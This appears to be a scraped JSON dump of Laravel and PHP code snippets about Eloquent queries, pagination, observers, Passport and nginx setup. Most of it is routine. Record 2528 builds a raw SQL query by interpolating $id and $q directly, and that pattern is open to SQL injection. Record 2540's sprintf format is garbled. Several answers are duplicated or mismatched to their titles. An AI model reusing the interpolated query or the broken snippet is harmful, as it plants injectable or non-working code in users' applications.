    "description": "class UserVerification extends Model {     protected $primaryKey = 'your_key_name'; // or null      public $incrementing = false;      // In Laravel 6.0+ make sure to also set $keyType     protected $keyType = 'string'; } \n",
    "reg_date": "2021-10-12T10:16:24.000Z"
  },
  {
    "id": 2515,
    "keyword": null,
    "link": null,
    "title": " laravel model insert",
    "description": "DB::table('users')->insert([     'email' => 'kayla@example.com',     'votes' => 0 ]);\nDistrictModel::insert([                 'code' => $data->code,                 'name' => $data->name,                 'region_id' => $data->region_id,                 'sorting' => $data->sorting,             ]);\n# The easiest way to create a model instance is using the  # make:model Artisan command:  php artisan make:model Flight  # If you would like to generate a database migration when you  # generate the model, you may use the --migration or -m option:  php artisan make:model Flight --migration php artisan make:model Flight -m\nmymodelname::insert([ \t'title' => 'mytitle' ]);\n// If there's a flight from Oakland to San Diego, set the price to $99. // If no matching model exists, create one. $flight = App\\Models\\Flight::updateOrCreate(     ['departure' => 'Oakland', 'destination' => 'San Diego'],     ['price' => 99, 'discounted' => 1] );\n$flight = App\\Models\\Flight::find(1);  $flight->name = 'New Flight Name';  $flight->save();\n",
    "reg_date": "2021-10-12T10:16:24.000Z"
  },
  {
    "id": 2516,
    "keyword": null,
    "link": null,
    "title": " laravel model is dirty",
    "description": "$user_id = auth()->user()->id;  Product::where('status', 'active')   ->whereNotIn('id', function($query) use ($user_id) {     $query->select('product_id')->from(new OrderProduct->getTable())       ->where('user_id', $user_id)->where('status', 'delivered') \t\t->pluck('product_id')->toArray();   });\nif($product->isDirty()){     // changes have been made } \nprotected function performUpdate(Builder $query, array $options = []) {     $dirty = $this->getDirty();      if (count($dirty) > 0)     {         // runs update query     }      return true; }\n",
    "reg_date": "2021-10-12T10:16:24.000Z"
  },
  {
    "id": 2517,
    "keyword": null,
    "link": null,
    "title": " laravel model particular column",
    "description": "//Eloquent: Get specific columns (not all the row). Pluck returns an array. Model::where('id', 1)->pluck('name', 'surname'); // If you only want to get the result value: Model::where('id', 1)->value('name');\nTable::select('column1', 'column2')             ->where('checker', 'value')             ->get();\nModelName::find($id, ['name', 'surname']);\n",
    "reg_date": "2021-10-12T10:16:24.000Z"
  },
  {
    "id": 2518,
    "keyword": null,
    "link": null,
    "title": " laravel model quard",
    "description": "class Topic extends Model {       protected $guarded = [ \"id\" ]; }  \n",
    "reg_date": "2021-10-12T10:16:24.000Z"
  },
  {
    "id": 2519,
    "keyword": null,
    "link": null,
    "title": " laravel model query limit",
    "description": "skip = OFFSET $products = $art->products->skip(0)->take(10)->get(); //get first 10 rows $products = $art->products->skip(10)->take(10)->get(); //get next 10 rows \n",
    "reg_date": "2021-10-12T10:16:24.000Z"
  },
  {
    "id": 2520,
    "keyword": null,
    "link": null,
    "title": " laravel model string primary key",
    "description": "class UserVerification extends Model {     protected $primaryKey = 'your_key_name'; // or null      public $incrementing = false;      // In Laravel 6.0+ make sure to also set $keyType     protected $keyType = 'string'; } \n",
    "reg_date": "2021-10-12T10:16:24.000Z"
  },
  {
    "id": 2521,
    "keyword": null,
    "link": null,
    "title": " laravel model tablename",
    "description": "protected $table = 'DomainRelatedSettings'; \n$item = new Item; $table = $item->getTable(); print_r($table);\npublic $table = \"dpl_user\";  protected $fillable = [ 'user_id', 'fname', 'lname', 'email', 'phone', 'msg'];\n$flight = App\\Models\\Flight::find(1);  $flight->name = 'New Flight Name';  $flight->save();\n// Eloquent's Model::query() returns the query builder  Model::where()->get(); // Is the same as  Model::query()->where()->get();  Model::query(); // Can be useful to add query conditions based on certain requirements  // See https://stackoverflow.com/questions/51517203/what-is-the-meaning-of-eloquents-modelquery\n",
    "reg_date": "2021-10-12T10:16:25.000Z"
  },
  {
    "id": 2522,
    "keyword": null,
    "link": null,
    "title": " laravel model truncate",
    "description": "MyModel::truncate();\n",
    "reg_date": "2021-10-12T10:16:25.000Z"
  },
  {
    "id": 2523,
    "keyword": null,
    "link": null,
    "title": " laravel model update table",
    "description": "ModelName::whereId($id)->update($request->all());\n$flight = App\\Models\\Flight::find(1);  $flight->name = 'New Flight Name';  $flight->save();\n// Eloquent's Model::query() returns the query builder  Model::where()->get(); // Is the same as  Model::query()->where()->get();  Model::query(); // Can be useful to add query conditions based on certain requirements  // See https://stackoverflow.com/questions/51517203/what-is-the-meaning-of-eloquents-modelquery\nPost::where('id',3)->update(['title'=>'Updated title']); \n$post = Post::find(3); $post->title = \"Updated title\"; $post->save();   or          $affectedRows = Post::where(\"id\", 3)->update([\"title\" => \"Updated title\"]); \n",
    "reg_date": "2021-10-12T10:16:25.000Z"
  },
  {
    "id": 2524,
    "keyword": null,
    "link": null,
    "title": " laravel model with methos custom columns",
    "description": "//with com colunas espec&iacute;ficar (rela&ccedil;&otilde;es com colunas espec&iacute;ficas) ->with([     'unidade' => function($query) {         $query->select('id','nome',);     },     'usuario' => function($query) {         $query->select('id','name',);     }, ])\n",
    "reg_date": "2021-10-12T10:16:25.000Z"
  },
  {
    "id": 2525,
    "keyword": null,
    "link": null,
    "title": " laravel model with migration",
    "description": "php artisan make:model Todo -mcr \nphp artisan make:model Model_Name -m\nphp artisan make:model Settings -m\n# If you would like to generate a database migration when you  # generate the model, you may use the --migration or -m option:  php artisan make:model Flight --migration php artisan make:model Flight -m\nphp artisan make:Model Status -m\nphp artisan make:model Settings --migration \n",
    "reg_date": "2021-10-12T10:16:25.000Z"
  },
  {
    "id": 2526,
    "keyword": null,
    "link": null,
    "title": " laravel model without timestamps",
    "description": "<?php  namespace App;  use Illuminate\\Database\\Eloquent\\Model;  class Post extends Model {     public $timestamps = false;      // }\n",
    "reg_date": "2021-10-12T10:16:25.000Z"
  },
  {
    "id": 2527,
    "keyword": null,
    "link": null,
    "title": " laravel multiple group by",
    "description": "$routes = DB::table('route') ->groupBy('rte_origin', 'rte_destination') ->get();\n",
    "reg_date": "2021-10-12T10:16:25.000Z"
  },
  {
    "id": 2528,
    "keyword": null,
    "link": null,
    "title": " laravel multiple paginate",
    "description": "# use default 'page' for this $collection1 = Model::paginate(20);  # use custom 'other_page' for this $collection2 = Model2::paginate(20); $collection2->setPageName('other_page');\n\"SELECT * FROM students WHERE students.user_id = $id AND (students.name like '%$q%' OR students.last_name Like '%$q%' OR students.email Like '%$q%')\" \n",
    "reg_date": "2021-10-12T10:16:25.000Z"
  },
  {
    "id": 2529,
    "keyword": null,
    "link": null,
    "title": " laravel mutators",
    "description": "class Video extends Model {     public function setDurationInMinutesAttribute($value)     {         $this->attributes['duration_in_seconds'] = $value * 60;     }      public function setDurationInHoursAttribute($value)     {         $this->attributes['duration_in_seconds'] = $value * 60 * 60;     } }  \nTo define a mutator, define a setFooAttribute method on your model where Foo   is the \"studly\" cased name of the column you wish to access. So, again, lets define a mutator for the first_name attribute. This mutator will be automatically called when we attempt to set the value of the first_name attribute on the model:  class User extends Model {     public function setFirstNameAttribute($value)     {         $this->attributes['first_name'] = strtolower($value);     } }\nMethods you can try :  1. $model->getAttributes()['name']; //worked for me 2. $model->getOriginal('name'); 3. $this->attributes['name'];\n",
    "reg_date": "2021-10-12T10:16:25.000Z"
  },
  {
    "id": 2530,
    "keyword": null,
    "link": null,
    "title": " laravel naming conventions",
    "description": "Gegasoft uses the following name conventions for laravel ============================================================= Variables\t=>\tcamelCase\t=>\t$articlesWithAuthor Collection Variable\t=>\tdescriptive, plural\t=>\t$activeUsers = User::active()->get() Object Variable\t=>\tdescriptive, singular\t=>\t$activeUser = User::active()->first() View\t=>\tsnake_case\t=>\tshow_filtered.blade.php Controllers\t=>\tsingular, ProperCase\t=>\tArticleController Model Name\t=>\tsingular, ProperCase\t=>\tUser, FollowingRequest Model attribute/property\t=>\tsnake_case\t=>\t$model->created_at Method\t=>\tcamelCase\t=>\tgetAll Method in resource controller\t=>\ttable\t=>\tstore Method in test class\t=>\tcamelCase\t=>\ttestGuestCannotSeeArticle hasOne/belongsTo relation\t=>\tsingular\t=>\tarticleComment Other relations\t=>\tplural\t=>\tarticleComments Table Name =>\tplural\t=>\tarticle_comments Table column\t=>\tsnake_case without model name\t=>\tmeta_title Route\t=>\tplural\t=>\tarticles/1 Named route\t=>\tsnake_case with dot notation\t=>\tusers.show_active Primary key\t=>\t-\t=>\tid Foreign key\t=>\tsingular model name with _id suffix\t=>\tarticle_id Pivot table\t=>\tsingular model names in alphabetical order\t=>\tarticle_user Migration\t=>\t-\t=>\t2017_01_01_000000_create_articles_table Config and language files index\t=>\tsnake_case\t=>\tarticles_enabled Config\t=>\tsnake_case\t=>\tgoogle_calendar.php Contract (interface)\t=>\tadjective or noun\t=>\tAuthenticatable Trait\t=>\tadjective\t=>\tNotifiable\n$post = Post::find(1);$post->comments()->saveMany([ new Comment(['message' => 'First comment']), new Comment(['message' => 'Second comment']),]);\n",
    "reg_date": "2021-10-12T10:16:26.000Z"
  },
  {
    "id": 2531,
    "keyword": null,
    "link": null,
    "title": " laravel nested wherehas",
    "description": "// given $user and $search: $packages = Package::where('alias','like',\"%$search%\")   ->whereHas('product.membership.club.user', function ($q) use ($user) {     $q->whereId($user->id);   })->get(); \n",
    "reg_date": "2021-10-12T10:16:26.000Z"
  },
  {
    "id": 2532,
    "keyword": null,
    "link": null,
    "title": " laravel new project",
    "description": "composer create-project laravel/laravel example-app\ncomposer create-project --prefer-dist laravel/laravel blog \"6.*\"\n// To install and use a specific version, you can enter it at the end of the command. // For example using version 5.8 ==> composer create-project --prefer-dist laravel/laravel projectName \"5.8.*\"\ncomposer global require laravel/installer  laravel new example-app  cd example-app  php artisan serve\ncomposer create-project --prefer-dist laravel/laravel blog \ncomposer create-project laravel/laravel --prefer-dist laravel-socialite-login-facebook-example\n",
    "reg_date": "2021-10-12T10:16:26.000Z"
  },
  {
    "id": 2533,
    "keyword": null,
    "link": null,
    "title": " laravel nginx config",
    "description": "server {     listen 80;     server_name example.com;     root /srv/example.com/public;      add_header X-Frame-Options \"SAMEORIGIN\";     add_header X-Content-Type-Options \"nosniff\";      index index.php;      charset utf-8;      location / {         try_files $uri $uri/ /index.php?$query_string;     }      location = /favicon.ico { access_log off; log_not_found off; }     location = /robots.txt  { access_log off; log_not_found off; }      error_page 404 /index.php;      location ~ \\.php$ {         fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;         fastcgi_param SCRIPT_FILENAME $realpath_root$fastcgi_script_name;         include fastcgi_params;     }      location ~ /\\.(?!well-known).* {         deny all;     } }\n# If you are using Nginx, the following directive in your site  # configuration will direct all requests to the index.php  # front controller:  location / {     try_files $uri $uri/ /index.php?$query_string; }\nlocation / {     try_files $uri $uri/ /index.php?$query_string; }\n",
    "reg_date": "2021-10-12T10:16:26.000Z"
  },
  {
    "id": 2534,
    "keyword": null,
    "link": null,
    "title": " laravel nigerian time zone",
    "description": "'timezone' = 'Africa/Lagos',\n",
    "reg_date": "2021-10-12T10:16:26.000Z"
  },
  {
    "id": 2535,
    "keyword": null,
    "link": null,
    "title": " laravel not finding asset files in public directory",
    "description": "Add ASSET_URL=public in your .env file and run php artisan config:cache\n",
    "reg_date": "2021-10-12T10:16:26.000Z"
  },
  {
    "id": 2536,
    "keyword": null,
    "link": null,
    "title": " laravel not in query",
    "description": "DB::table(..)->select(..)->whereNotIn('book_price', [100,200])->get();\n",
    "reg_date": "2021-10-12T10:16:26.000Z"
  },
  {
    "id": 2537,
    "keyword": null,
    "link": null,
    "title": " laravel notification render",
    "description": "Route::get('mail-preview', function () {     return (new MyNotification())->toMail($some_user); }); \nphp artisan make:notification InvoicePaid\nphp artisan make:notification notificationName\n",
    "reg_date": "2021-10-12T10:16:26.000Z"
  },
  {
    "id": 2538,
    "keyword": null,
    "link": null,
    "title": " laravel nova 3 belongtomany don't display",
    "description": "They are displayed only in resource details\n",
    "reg_date": "2021-10-12T10:16:26.000Z"
  },
  {
    "id": 2539,
    "keyword": null,
    "link": null,
    "title": " laravel nova create user",
    "description": "php artisan nova:user \n",
    "reg_date": "2021-10-12T10:16:27.000Z"
  },
  {
    "id": 2540,
    "keyword": null,
    "link": null,
    "title": " laravel number add 0 before",
    "description": "<?php $num = 4; $num_padded = sprintf(\"\u0002d\", $num); echo $num_padded; // returns 04 ?>\n",
    "reg_date": "2021-10-12T10:16:27.000Z"
  },
  {
    "id": 2541,
    "keyword": null,
    "link": null,
    "title": " laravel object to array",
    "description": "$person = new stdClass(); $person->firstName = \"Taylor\"; $person->age = 32;  //Convert Single-Dimention Object to array $personArray = (array) $person;  //Convert Multi-Dimentional Object to Array $personArray = objectToArray($person); function objectToArray ($object) {     if(!is_object($object) && !is_array($object)){     \treturn $object;     }     return array_map('objectToArray', (array) $object); }\n$users = App\\User::all(); $users = $users->toArray();\nfunction objectToArray(&$object) {     return @json_decode(json_encode($object), true); } \n",
    "reg_date": "2021-10-12T10:16:27.000Z"
  },
  {
    "id": 2542,
    "keyword": null,
    "link": null,
    "title": " laravel observer",
    "description": "# If you would like to generate a database migration when you  # generate the model, you may use the --migration or -m option:  php artisan make:model Flight --migration php artisan make:model Flight -m\nretrieved creating created updating updated saving saved deleting deleted restoring restored\nphp artisan make:observer nameOfObserver --model=modelName\nphp artisan make:observer UserObserver --model=User\n<?php  namespace App\\Observers;  use App\\Models\\User;  class UserObserver {     /**      * Handle the User \"created\" event.      *      * @param  \\App\\Models\\User  $user      * @return void      */     public function created(User $user)     {         //     }      /**      * Handle the User \"updated\" event.      *      * @param  \\App\\Models\\User  $user      * @return void      */     public function updated(User $user)     {         //     }      /**      * Handle the User \"deleted\" event.      *      * @param  \\App\\Models\\User  $user      * @return void      */     public function deleted(User $user)     {         //     }      /**      * Handle the User \"forceDeleted\" event.      *      * @param  \\App\\Models\\User  $user      * @return void      */     public function forceDeleted(User $user)     {         //     } }\n<?php  namespace App\\Providers;  use App\\Observers\\UserObserver; use App\\Models\\User; use Illuminate\\Support\\ServiceProvider;  class AppServiceProvider extends ServiceProvider {     /**      * Register any application services.      *      * @return void      */     public function register()     {         //     }      /**      * Bootstrap any application services.      *      * @return void      */     public function boot()     {         User::observe(UserObserver::class);     } }\n",
    "reg_date": "2021-10-12T10:16:27.000Z"
  },
  {
    "id": 2543,
    "keyword": null,
    "link": null,
    "title": " laravel observer check if field changed",
    "description": "class UserObserver {       /**      * Listen to the User created event.      *      * @param  \\App\\User  $user      * @return void      */     public function updating(User $user)     {       if($user->isDirty('email')){         // email has changed         $new_email = $user->email;          $old_email = $user->getOriginal('email');       }     }  }\n",
    "reg_date": "2021-10-12T10:16:27.000Z"
  },
  {
    "id": 2544,
    "keyword": null,
    "link": null,
    "title": " laravel observer events",
    "description": "retrieved creating created updating updated saving saved deleting deleted restoring restored\nphp artisan event:generate\n<?php  namespace App\\Observers;  use App\\Models\\User;  class UserObserver {     /**      * Handle the User \"created\" event.      *      * @param  \\App\\Models\\User  $user      * @return void      */     public function created(User $user)     {         //     }      /**      * Handle the User \"updated\" event.      *      * @param  \\App\\Models\\User  $user      * @return void      */     public function updated(User $user)     {         //     }      /**      * Handle the User \"deleted\" event.      *      * @param  \\App\\Models\\User  $user      * @return void      */     public function deleted(User $user)     {         //     }      /**      * Handle the User \"forceDeleted\" event.      *      * @param  \\App\\Models\\User  $user      * @return void      */     public function forceDeleted(User $user)     {         //     } }\n<?php  namespace App\\Providers;  use App\\Observers\\UserObserver; use App\\Models\\User; use Illuminate\\Support\\ServiceProvider;  class AppServiceProvider extends ServiceProvider {     /**      * Register any application services.      *      * @return void      */     public function register()     {         //     }      /**      * Bootstrap any application services.      *      * @return void      */     public function boot()     {         User::observe(UserObserver::class);     } }\n",
    "reg_date": "2021-10-12T10:16:27.000Z"
  },
  {
    "id": 2545,
    "keyword": null,
    "link": null,
    "title": " laravel old value for select option",
    "description": "@foreach($services as $service) \t@if (old('category') == $service->id)   \t\t<option value=\"{{ $service->id }}\" selected>{{ $service->title }}</option>   \t@else \t\t<option value=\"{{ $service->id }}\">{{ $service->title }}</option> \t@endif @endforeach\n{{ old('title') == '1' ? 'selected' : '' }} <div class=\"form-group col-md-6\"> <label>Nationality {{$profiledata->nationality}}</label>    <select id=\"nationality\" required=\"\" name=\"nationality\" class=\"form-control\">     <option value=\"\">--Select--</option>     <option {{ ($profiledata->nationality) == 'United State' ? 'selected' : '' }}  value=\"United State\">United State</option>     <option {{ ($profiledata->nationality) == 'India' ? 'selected' : '' }}  value=\"India\">India</option>     <option {{ ($profiledata->nationality) == 'Canada' ? 'selected' : '' }}  value=\"Canada\">Canada</option>   </select> </div>\n<option value=\"{{ $key }}\" {{ (Input::old(\"title\") == $key ? \"selected\":\"\") }}>{{ $val }}</option> \n# Populate Old value with default value selected # Laravel 8 <select name=\"dial_code\" id=\"dial_code\"> @foreach($countries as $c)     <option value=\"{{$c->phone_code}}\" title=\"{{$c->name}}\" {{old('dial_code', 966) == $c->phone_code ? 'selected' : ''}}>{{$c->iso2}} ({{$c->phone_code}})</option> @endforeach </select>\n",
    "reg_date": "2021-10-12T10:16:27.000Z"
  },
  {
    "id": 2546,
    "keyword": null,
    "link": null,
    "title": " laravel old value not working in textarea",
    "description": "<fieldset class=\"form-group\">   @error('address')   \t<span class=\"invalid-feedback\" role=\"alert\">   \t\t<strong>{{ $message }}</strong>   \t\t</span>   @enderror   <textarea  id=\"address\" rows=\"4\" class=\"text-capitalize round form-control @error('address') is-invalid @enderror\" name=\"address\" placeholder=\"Company Address\" required autocomplete=\"address\" autofocus>{{ old('address') }}</textarea>  </fieldset>\n",
    "reg_date": "2021-10-12T10:16:27.000Z"
  },
  {
    "id": 2547,
    "keyword": null,
    "link": null,
    "title": " laravel old value or default",
    "description": "{{ old('salary_' . $employee->id, 'Default') }}\n",
    "reg_date": "2021-10-12T10:16:27.000Z"
  },
  {
    "id": 2548,
    "keyword": null,
    "link": null,
    "title": " laravel on delete set null",
    "description": "$table->...->onDelete('set null');\n$table->...->onDelete('set null');  #First make sure you set the foreign key field as nullable: $table->integer('foreign_id')->unsigned()->nullable(); \n$table->foreignId('user_id')       ->constrained()       ->onDelete('cascade');\n",
    "reg_date": "2021-10-12T10:16:28.000Z"
  },
  {
    "id": 2549,
    "keyword": null,
    "link": null,
    "title": " laravel one to many relationship example",
    "description": "<?php  namespace App\\Models;  use Illuminate\\Database\\Eloquent\\Model;  class User extends Model {     /**      * Get the phone associated with the user.      */     public function phone()     {         return $this->hasOne(Phone::class);     } }\n$user->roles()->attach($roleIds); $user->roles()->detach($roleIds); $user->roles()->sync($roleIds); $user->roles()->toggle($roleIds);\nFor example, a blog post may have an infinite number of comments. And a single comment belongs to only a single post    class Post extends Model {     public function comments()     {         return $this->hasMany('App\\Models\\Comment');     } }  class Comment extends Model {     public function post()     {         return $this->belongsTo('App\\Models\\Post');     } }\nclass Post extends Model {    // 1 Post has many comments     public function comments()     {         return $this->hasMany(Comment::class);     } }\n<?php  namespace App\\Models;  use Illuminate\\Database\\Eloquent\\Model;  class Post extends Model {     /**      * Get the comments for the blog post.      */     public function comments()     {         return $this->hasMany(Comment::class);     } }\nuse App\\Models\\User;  $user = User::find(1);  $user->roles()->attach($roleId);\n",
    "reg_date": "2021-10-12T10:16:28.000Z"
  },
  {
    "id": 2550,
    "keyword": null,
    "link": null,
    "title": " laravel orWhere",
    "description": "User::query()    ->where('name', 'LIKE', \"%{$searchTerm}%\")     ->orWhere('email', 'LIKE', \"%{$searchTerm}%\")     ->get();  reference: https://freek.dev/1182-searching-models-using-a-where-like-query-in-laravel\n$camps = $field->camps()->where('status', 0)->where(function ($q) {     $q->where('sex', Auth::user()->sex)->orWhere('sex', 0); })->get();\n$users = DB::table('users')                 ->where('name', 'like', 'T%')                 ->get();\nTable::where('Column', Value)->where('NewColumn', Value)->get();\n",
    "reg_date": "2021-10-12T10:16:28.000Z"
  },
  {
    "id": 2551,
    "keyword": null,
    "link": null,
    "title": " laravel order by",
    "description": "$posts = Post::orderBy('id', 'DESC')->get();\n->orderBy('id', 'DESC');\n$users = DB::table('users')          -> orderBy('name', 'desc')          -> get();\n$affected = DB::table('users')               ->where('id', 1)               ->update(['votes' => 1]);\nDB::table(..)->select(..)->whereNotIn('book_price', [100,200])->get();\n/**  * Show the application dashboard.  *  * @return \\Illuminate\\Http\\Response  */ public function index() {     $messages = Message::select(\"*\")                             ->where('receiver_id',$id)                             ->orderBy('created_at', 'desc')                             ->get();        dd($messages); }\n",
    "reg_date": "2021-10-12T10:16:28.000Z"
  },
  {
    "id": 2552,
    "keyword": null,
    "link": null,
    "title": " laravel order by asc not null",
    "description": "select id, slug, position from  products order by -position DESC\n",
    "reg_date": "2021-10-12T10:16:28.000Z"
  },
  {
    "id": 2553,
    "keyword": null,
    "link": null,
    "title": " laravel order by desc",
    "description": "$posts = Post::orderBy('id', 'DESC')->get();\n->orderBy('id', 'DESC');\n$orders = DB::table('orders')                 ->orderByRaw('updated_at - created_at DESC')                 ->get();\n/**  * Show the application dashboard.  *  * @return \\Illuminate\\Http\\Response  */ public function index() {     $messages = Message::select(\"*\")                             ->where('receiver_id',$id)                             ->orderBy('created_at', 'desc')                             ->get();        dd($messages); }\n",
    "reg_date": "2021-10-12T10:16:28.000Z"
  },
  {
    "id": 2554,
    "keyword": null,
    "link": null,
    "title": " laravel order by random",
    "description": "$galleries = App\\Gallery::inRandomOrder()->get(); //Or DB::table('gallery')->inRandomOrder()->get(); \nModel::select('column')->where('column','value')->inRandomOrder()     ->limit(2) // here is yours limit     ->get();  ------------------ OR --------------------  Model::inRandomOrder()->select('column')->where('column','value')->first();\n",
    "reg_date": "2021-10-12T10:16:28.000Z"
  },
  {
    "id": 2555,
    "keyword": null,
    "link": null,
    "title": " laravel order by raw",
    "description": "$orders = DB::table('orders')                 ->orderByRaw('updated_at - created_at DESC')                 ->get();\n",
    "reg_date": "2021-10-12T10:16:28.000Z"
  },
  {
    "id": 2556,
    "keyword": null,
    "link": null,
    "title": " laravel orderby with relation",
    "description": "$users = User::with(['student' => function ($q) {             $q->orderBy('id', 'desc');         }]);\n",
    "reg_date": "2021-10-12T10:16:28.000Z"
  },
  {
    "id": 2557,
    "keyword": null,
    "link": null,
    "title": " laravel pagination and post",
    "description": "Here are the complete answer     - Web.php    Route::get('/faq', 'MainController@faq')->name('faq');  Route::any('/faq-search', 'MainController@faqSearch')->name('faqSearch');  - Controller          public function faq()     {         $faqs = Faq::paginate(5);          return view('guest.faq', compact('faqs'));     }      public function faqSearch(Request $request)     {         $faqSearch = $request->get('faqSearch');          $faqs = Faq::where('en_question', 'like', $faqSearch.'%')->paginate(5)->setPath('');          $pagination = $faqs->appends(array(           'faqSearch' => $faqSearch         ));          return view('guest.faq', compact('faqs', 'faqSearch'));     }  - View (Blade)                <form action=\"{{route('faqSearch')}}\" method=\"post\">               @csrf                  <div class=\"input-group flex-nowrap\">                     <div class=\"input-group-prepend\">                         <button class=\"btn btn-primary input-group-text\" type=\"submit\">                             <i class=\"fa fa-search\"></i>                         </button>                     </div>                     <input type=\"text\" name=\"faqSearch\" class=\"form-control\" placeholder=\"Search\" aria-label=\"Search\" aria-describedby=\"addon-wrapping\" value=\"{{ old('faqSearch', $faqSearch ?? '') }}\" >                 </div>             </form>                  <div class=\"col-md-3 mx-auto\">                 {{ $faqs->links() }}             </div>       Thank you so much to \"Avinash Nethala\"      Resource      - https://medium.com/justlaravel/paginated-data-with-search-functionality-in-laravel-ee0b1668b687 - https://laravel.com/docs/5.3/pagination\nDB::table('users') -> paginate(15)\n",
    "reg_date": "2021-10-12T10:16:28.000Z"
  },
  {
    "id": 2558,
    "keyword": null,
    "link": null,
    "title": " laravel pagination keep query string",
    "description": "$result->appends(request()->query())->links()\n{{ $users->withQueryString()->links() }} \n",
    "reg_date": "2021-10-12T10:16:29.000Z"
  },
  {
    "id": 2559,
    "keyword": null,
    "link": null,
    "title": " laravel pagination publish command",
    "description": "php artisan vendor:publish --tag=laravel-pagination\n",
    "reg_date": "2021-10-12T10:16:29.000Z"
  },
  {
    "id": 2560,
    "keyword": null,
    "link": null,
    "title": " laravel pagination vuetify",
    "description": "<v-pagination     v-model=\"pagination.current\"     :length=\"pagination.total\"     @input=\"onPageChange\" ></v-pagination>\nexport default {     data() {         return {             users: null,             pagination: {                 current: 1,                 total: 0             }         }     },     methods: {         getUsers() {             window.axios.get('/api/users?page=' + this.pagination.current)                 .then(response => {                     this.users = response.data.data;                     this.pagination.current = response.data.current_page;                     this.pagination.total = response.data.last_page;                 });         },         onPageChange() {             this.getUsers();         }     },     mounted() {         this.getUsers();     } }\n",
    "reg_date": "2021-10-12T10:16:29.000Z"
  },
  {
    "id": 2561,
    "keyword": null,
    "link": null,
    "title": " laravel pagination with get parameters",
    "description": "Suppose $users is a paginated eloquent collection  $users = User::paginate(10);  You can append attributes to the pagination links;  {{ $users->appends(['sort' => 'votes'])->links() }}  This would result in a url like /users?page=2&sort=votes  You can get the total record count with $users->total()\n{{ $users->withQueryString()->links() }} \n",
    "reg_date": "2021-10-12T10:16:29.000Z"
  },
  {
    "id": 2562,
    "keyword": null,
    "link": null,
    "title": " laravel parent child same table",
    "description": "    public function parent()     {         return $this->belongsTo('App\\CourseModule','parent_id')->where('parent_id',0);     }      public function children()     {         return $this->hasMany('App\\CourseModule','parent_id');     } \n",
    "reg_date": "2021-10-12T10:16:29.000Z"
  },
  {
    "id": 2563,
    "keyword": null,
    "link": null,
    "title": " laravel pass variables to view",
    "description": "return view(\"blog\", [\"posts\"=>$posts]); Or: return view(\"blog\", compact(\"posts\"));\nreturn view('home')->with('userName',$userName);\nRoute::get('/', function () {     return view('greeting', ['name' => 'James']); });\n",
    "reg_date": "2021-10-12T10:16:29.000Z"
  },
  {
    "id": 2564,
    "keyword": null,
    "link": null,
    "title": " laravel pass view with data",
    "description": "return view(\"blog\", [\"posts\"=>$posts]); Or: return view(\"blog\", compact(\"posts\"));\nreturn view('home')->with('userName',$userName);\n",
    "reg_date": "2021-10-12T10:16:29.000Z"
  },
  {
    "id": 2565,
    "keyword": null,
    "link": null,
    "title": " laravel passport",
    "description": "1 - composer require laravel/passport 2 - php artisan migrate 3 - php artisan passport:install 4 - go to user model   <?php  namespace App\\Models;  use Illuminate\\Database\\Eloquent\\Factories\\HasFactory; use Illuminate\\Foundation\\Auth\\User as Authenticatable; use Illuminate\\Notifications\\Notifiable; use Laravel\\Passport\\HasApiTokens;  class User extends Authenticatable {     use HasApiTokens, HasFactory, Notifiable; } ?>      5 - go to App\\Providers\\AuthServiceProvider   <?php  namespace App\\Providers;  use Illuminate\\Foundation\\Support\\Providers\\AuthServiceProvider as ServiceProvider; use Illuminate\\Support\\Facades\\Gate; use Laravel\\Passport\\Passport;  class AuthServiceProvider extends ServiceProvider {     /**      * The policy mappings for the application.      *      * @var array      */     protected $policies = [         'App\\Models\\Model' => 'App\\Policies\\ModelPolicy',     ];      /**      * Register any authentication / authorization services.      *      * @return void      */     public function boot()     {         $this->registerPolicies();          if (! $this->app->routesAreCached()) {             Passport::routes();         }     } }     ?>   7 - go to config/auth.php     'guards' => [     'web' => [         'driver' => 'session',         'provider' => 'users',     ],      'api' => [         'driver' => 'passport',         'provider' => 'users',     ], ],\nfor get client key in laravel passport run this command :  php artisan passport:client --personal\nphp artisan passport:install\n",
    "reg_date": "2021-10-12T10:16:29.000Z"
  },
  {
    "id": 2566,
    "keyword": null,
    "link": null,
    "title": " laravel passport client",
    "description": "1 - composer require laravel/passport 2 - php artisan migrate 3 - php artisan passport:install 4 - go to user model   <?php  namespace App\\Models;  use Illuminate\\Database\\Eloquent\\Factories\\HasFactory; use Illuminate\\Foundation\\Auth\\User as Authenticatable; use Illuminate\\Notifications\\Notifiable; use Laravel\\Passport\\HasApiTokens;  class User extends Authenticatable {     use HasApiTokens, HasFactory, Notifiable; } ?>      5 - go to App\\Providers\\AuthServiceProvider   <?php  namespace App\\Providers;  use Illuminate\\Foundation\\Support\\Providers\\AuthServiceProvider as ServiceProvider; use Illuminate\\Support\\Facades\\Gate; use Laravel\\Passport\\Passport;  class AuthServiceProvider extends ServiceProvider {     /**      * The policy mappings for the application.      *      * @var array      */     protected $policies = [         'App\\Models\\Model' => 'App\\Policies\\ModelPolicy',     ];      /**      * Register any authentication / authorization services.      *      * @return void      */     public function boot()     {         $this->registerPolicies();          if (! $this->app->routesAreCached()) {             Passport::routes();         }     } }     ?>   7 - go to config/auth.php     'guards' => [     'web' => [         'driver' => 'session',         'provider' => 'users',     ],      'api' => [         'driver' => 'passport',         'provider' => 'users',     ], ],\nfor get client key in laravel passport run this command :  php artisan passport:client --personal\nphp artisan passport:install\n",
    "reg_date": "2021-10-12T10:16:29.000Z"
  },
  {
    "id": 2567,
    "keyword": null,
    "link": null,
    "title": " laravel passport generate key",
    "description": "php artisan passport:keys\n",
    "reg_date": "2021-10-12T10:16:29.000Z"
  },
  {
    "id": 2568,
    "keyword": null,
    "link": null,
    "title": " laravel password encryption",
    "description": "$password = bcrypt('secret');\n$password = Hash::make('yourPa$$w0rd');\n$password = Hash::make('secret');\n",
    "reg_date": "2021-10-12T10:16:30.000Z"
  },
  {
    "id": 2569,
    "keyword": null,
    "link": null,
    "title": " laravel password verification",
    "description": "// verification of password if (Hash::check('secret', $hashedPassword)) {     // The passwords match... }  // encyption of password $password = Hash::make('secret');\n",
    "reg_date": "2021-10-12T10:16:30.000Z"
  },
  {
    "id": 2570,
    "keyword": null,
    "link": null,
    "title": " laravel permission spatie cache clear",
    "description": "php artisan cache:forget spatie.permission.cache  then  php artisan optimize:clear \n",
    "reg_date": "2021-10-12T10:16:30.000Z"
  },
  {
    "id": 2571,
    "keyword": null,
    "link": null,
    "title": " laravel php artisan make:controller  in subfolder",
    "description": "php artisan make:controller subfolder/SomeController \n",
    "reg_date": "2021-10-12T10:16:30.000Z"
  },
  {
    "id": 2572,
    "keyword": null,
    "link": null,
    "title": " laravel please provide a valid cache path",
